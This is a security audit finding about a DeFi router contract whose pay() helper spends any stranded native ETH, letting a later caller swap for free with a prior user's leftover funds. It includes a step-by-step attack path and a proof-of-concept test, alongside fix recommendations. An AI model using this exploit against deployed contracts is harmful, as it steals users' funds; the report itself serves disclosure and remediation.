### Title
Router `pay()` silently consumes any stranded native ETH on behalf of an arbitrary later caller, stealing the original depositor's funds — (File: `metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary

The `pay()` helper in `PeripheryPayments` uses `address(this).balance` — the router's total native ETH balance — to settle WETH-input swaps, completely ignoring the `payer` argument whenever native ETH is present. Because the router's payable swap functions (`exactInputSingle`, `exactOutputSingle`, `exactOutput`) never automatically refund excess ETH, any ETH left on the router after one user's call is silently consumed by the next caller who swaps with WETH as `tokenIn`, giving that caller a free swap and permanently losing the original depositor's ETH.

### Finding Description

**Root cause — `pay()` ignores `payer` when native ETH is available** [1](#0-0) 

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);   // payer never touched
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
```

When `nativeBalance >= value`, the function deposits the router's own ETH and transfers the resulting WETH to the pool. The `payer` stored in transient context is never consulted. Any ETH that happens to be on the router — regardless of who put it there — is used to settle the swap.

**How ETH becomes stranded**

Every payable swap entry point (`exactInputSingle`, `exactOutputSingle`, `exactOutput`) is `payable` and accepts `msg.value`, but none of them automatically refund unused ETH: [2](#0-1) 

A user calling `exactOutputSingle{value: amountInMaximum}` with WETH as `tokenIn` sends up to `amountInMaximum` ETH. The pool determines the actual `amountIn`; the callback calls `pay(WETH, user, pool, amountIn)`. If `amountIn < amountInMaximum`, the difference stays on the router with no refund. The same applies to `exactInputSingle{value: X}` when `X > amountIn`.

The protocol's own test acknowledges this and requires an explicit `refundETH()` call inside a `multicall` to recover the excess: [3](#0-2) 

But `refundETH()` is a separate, optional step. A user calling any swap function directly (outside a multicall) has no way to atomically reclaim the excess.

**Attack path**

1. Victim calls `exactOutputSingle{value: 1 ETH}` with WETH as `tokenIn`, `amountOut = X`. The pool requires only 0.6 ETH. The callback deposits 0.6 ETH as WETH and pays the pool. 0.4 ETH remains on the router.
2. Attacker calls `exactInputSingle{value: 0}` with WETH as `tokenIn`, `amountIn = 0.4 ETH`. The callback fires: `pay(WETH, attacker, pool, 0.4 ETH)`. `address(this).balance = 0.4 ETH ≥ value`, so the router deposits the victim's 0.4 ETH as WETH and pays the pool. The attacker receives the swap output without spending any ETH or WETH.

The attacker's `payer` (their own address) is never charged. The victim's 0.4 ETH is permanently lost.

**Why `receive()` does not prevent stranding** [4](#0-3) 

`receive()` blocks plain ETH transfers from non-WETH addresses, but `msg.value` attached to a payable function call bypasses `receive()` entirely. ETH sent with `exactOutputSingle{value: X}` lands on the router's balance without triggering `receive()`.

### Impact Explanation

Direct loss of user principal. The victim's excess ETH — which can be an arbitrarily large fraction of `amountInMaximum` — is consumed by the attacker's swap. The attacker receives real token output at zero cost. The pool is not harmed (it receives correct WETH), but the victim's ETH is irrecoverably gone.

### Likelihood Explanation

Medium. The trigger condition — ETH stranded on the router — arises naturally whenever a user calls any payable swap function directly (not via a `multicall` that includes `refundETH()`). `exactOutputSingle` is the most common case: the user cannot know the exact `amountIn` in advance and must send `amountInMaximum`. Any difference is stranded. An attacker monitoring the mempool or the router's ETH balance can exploit this immediately after the victim's transaction confirms.

### Recommendation

1. **Auto-refund excess ETH** at the end of `exactOutputSingle` and `exactOutput` (analogous to how Uniswap v3 periphery v2 added automatic refunds).
2. **Alternatively**, track the ETH balance attributable to the current `msg.sender` at entry (e.g., `uint256 ethBefore = address(this).balance - msg.value`) and only allow `pay()` to use `msg.value` worth of native ETH, not any pre-existing balance.
3. **At minimum**, document prominently that every payable swap call must be wrapped in a `multicall` that ends with `refundETH()`, and consider making the swap functions non-payable when WETH is not the input token.

pragma solidity ^0.8.35;

// Assume: pool(WETH/token1) exists, attacker has no WETH/ETH, victim has ETH.

function test_strandedEthStolenByAttacker() external {
    uint128 amountOut = 1_000;
    // Victim gets a quote: actual amountIn = 600 wei
    // Victim sends 1_000 wei (amountInMaximum) directly — no multicall, no refundETH
    vm.prank(victim);
    router.exactOutputSingle{value: 1_000}(
        IMetricOmmSimpleRouter.ExactOutputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountOut: amountOut,
            amountInMaximum: 1_000,
            recipient: victim,
            deadline: type(uint256).max,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    // 400 wei of victim's ETH is now stranded on the router
    assertEq(address(router).balance, 400);

    // Attacker has zero ETH and zero WETH
    assertEq(attacker.balance, 0);
    assertEq(weth.balanceOf(attacker), 0);

    // Attacker calls exactInputSingle with value=0; pay() uses the stranded 400 wei
    vm.prank(attacker);
    uint256 stolen = router.exactInputSingle{value: 0}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 400,          // matches stranded balance
            amountOutMinimum: 0,
            recipient: attacker,
            deadline: type(uint256).max,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // Attacker received token1 output for free; victim lost 400 wei
    assertGt(token1.balanceOf(attacker), 0, "attacker got free output");
    assertEq(address(router).balance, 0,    "stranded ETH consumed");
}
```

  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    int128 expectedAmountOut = MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountOut);
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(params.recipient, params.zeroForOne, -expectedAmountOut, priceLimitX64, "", params.extensionData);
    int128 amountOut = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    if (amountOut != expectedAmountOut) revert InvalidOutputAmount(amountOut, params.amountOut);

    amountIn = MetricOmmSwapInputs.int128ToUint128(
      MetricOmmSwapResults.extractAmountIn(params.zeroForOne, amount0Delta, amount1Delta)
    );

    if (amountIn > params.amountInMaximum) revert InputTooHigh(amountIn, params.amountInMaximum);
    _clearExpectedCallbackPool();
  }
